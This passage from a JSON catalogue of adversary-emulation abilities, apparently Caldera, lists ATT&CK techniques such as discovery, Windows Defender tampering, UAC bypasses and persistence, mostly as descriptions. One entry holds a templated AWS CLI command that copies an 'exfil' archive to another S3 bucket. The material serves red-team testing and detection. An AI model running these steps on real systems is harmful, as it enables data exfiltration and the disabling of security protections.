        "description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Information Discovery with WMIC",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "3ca47fba752a36e5492a747e16dd2311",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Network Configuration Discovery (TrickBot Style)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "9b5a0a6644a9cccc3dc3aa8be490430e",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Network Configuration Discovery on Windows",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "7d8ee68f0e9731db82964f558f614608",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Connections Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Network Connections Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "a14392d713dffba6a397682ff83259a0",
        "technique_id": "T1049",
        "repeatable": false
    },
    {
        "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Connections Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Network Connections Discovery with PowerShell",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "8ed60dceb98746f1da6214f4f6af7164",
        "technique_id": "T1049",
        "repeatable": false
    },
    {
        "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Owner/User Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "942316dc6a362e44b248a872e5f42c92",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: COR_PROFILER",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Scope COR_PROFILER",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "e41543eff9eebdbceef4ee8229cabf98",
        "technique_id": "T1574.012",
        "repeatable": false
    },
    {
        "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Service Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "d6bb2a19da7246731ed9c44831b135f8",
        "technique_id": "T1007",
        "repeatable": false
    },
    {
        "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Service Discovery - net.exe",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "a088eb8a2130689fa774ec2653f79db1",
        "technique_id": "T1007",
        "repeatable": false
    },
    {
        "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Time Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Time Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "01a25d2158c216cd645bbadf09015abf",
        "technique_id": "T1124",
        "repeatable": false
    },
    {
        "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Time Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Time Discovery - PowerShell",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "6913e132cdd2d9c29294490c2fbef2eb",
        "technique_id": "T1124",
        "repeatable": false
    },
    {
        "description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Time Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Time Discovery W32tm as a Delay",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "d2b459d6fa4aa8fa31e745e1b3d737c3",
        "technique_id": "T1124",
        "repeatable": false
    },
    {
        "description": "Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time\nRecently observed in use in the wild during an incident involving Ursnif malware:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml\nhttps://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Time Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Time with Windows time Command",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f3e078e1df8bd7b934236b5d82f012de",
        "technique_id": "T1124",
        "repeatable": false
    },
    {
        "description": "Identify system processes",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ps aux",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "System processes",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "SystemBC Malware-as-a-Service Registry",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "9b74d10b3164f13d357830d1a6ee334a",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Take ownership using takeown utility",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2cef8bdaa82b0487e8e8456867a9decf",
        "technique_id": "T1222.001",
        "repeatable": false
    },
    {
        "description": "Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. \nTake note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that \ntries to tamper this Win Defender feature settings.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tamper Win Defender Protection",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "faa0f322531905d388c33f66d6c6a286",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tamper with Windows Defender ATP PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f0fde90a3d59061b226197974e7dcbaa",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tamper with Windows Defender ATP using Aliases - PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "32047c4f30d4e65ebc9b22b9b8368bca",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tamper with Windows Defender Command Prompt",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "29b7a018dce0877b3d2292286a0f512f",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tamper with Windows Defender Evade Scanning -Extension",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e0946bc3b8b888d6c4cdf3f023fe3c0b",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tamper with Windows Defender Evade Scanning -Folder",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5c4ea84c2b050f1f8b6f880755ccbc62",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tamper with Windows Defender Evade Scanning -Process",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c407315583b3a00d9a2e0c3c510f2c96",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tamper with Windows Defender Registry",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "43e3334362b140924f001b256b229ee5",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Task Scheduler via VBA",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "920a251237fac2b70fe4d647aa16bfdd",
        "technique_id": "T1053.005",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "TeamViewer Files Detected Test on Windows",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "f50ec080343f1bec4e739dd20675c349",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Terminal Server Client Connection History Cleared",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0fa53cacfb86254022a27a050159fa83",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Non-Standard Port",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Testing usage of uncommonly used port with PowerShell",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "7f734143338de2b02093a703f919e7fc",
        "technique_id": "T1571",
        "repeatable": false
    },
    {
        "description": "This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the \"Atomic Red Team\" caption after one or two seconds. ",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Thread Execution Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Thread Execution Hijacking",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "f85556ac016baf1d7938396a6c048166",
        "technique_id": "T1055.003",
        "repeatable": false
    },
    {
        "description": "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create or Modify System Process: Windows Service",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "TinyTurla backdoor service w64time",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d04c129f52b4b6c47582faf785fdb541",
        "technique_id": "T1543.003",
        "repeatable": false
    },
    {
        "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Proxy: Multi-hop Proxy",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tor Proxy Usage - Windows",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "7a3cf53858c519cfc11eff3c7b813ac9",
        "technique_id": "T1090.003",
        "repeatable": false
    },
    {
        "description": "Transfer the compressed archive from one S3 bucket to another S3 bucket via AWS CLI. It is assumed that the proper\npolicies and security rules are in place to allow reading from the source bucket and writing to the destination\nbucket.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Transfer Data to Cloud Account",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Transfer Compressed Archive to Separate S3 Bucket via AWS CLI",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "ba0deadb-97ac-4a4c-aa81-21912fc90980",
        "technique_id": "T1537",
        "repeatable": false
    },
    {
        "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "TruffleSnout - Listing AD Infrastructure",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "130bbfbbd1c09a723a3ad848f0ef8da5",
        "technique_id": "T1482",
        "repeatable": false
    },
    {
        "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UAC Bypass with WSReset Registry Modification",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "64430e7597668877a832b9d1e379c9f2",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Determine whether or not UAC is enabled",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UAC Status",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "7c42a30c-c8c7-44c5-80a8-862d364ac1e4",
        "technique_id": "T1518.001",
        "repeatable": false
    },
    {
        "description": "Set a registry key to allow UAC bypass",
        "buckets": [
            "privilege-escalation"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UAC bypass registry",
        "tactic": "privilege-escalation",
        "plugin": "stockpile",
        "ability_id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UACME Bypass Method 23",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "c075d43b9dbd82bcbe36e82c7fee318a",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UACME Bypass Method 31",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "a858f6dce84f8f41306497474cfa952f",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UACME Bypass Method 33",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "65543e25f0be2d93b572fd6e774a8432",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UACME Bypass Method 34",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "a55327064e0992e3a12b50328733034d",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UACME Bypass Method 39",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "8b29cf959638afc0ecc68406e492b197",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UACME Bypass Method 56",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "ef767bd150ff4c55c23837f0e3be6195",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "UACME Bypass Method 59",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "44dfbc0aace944657118f7287b828da2",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
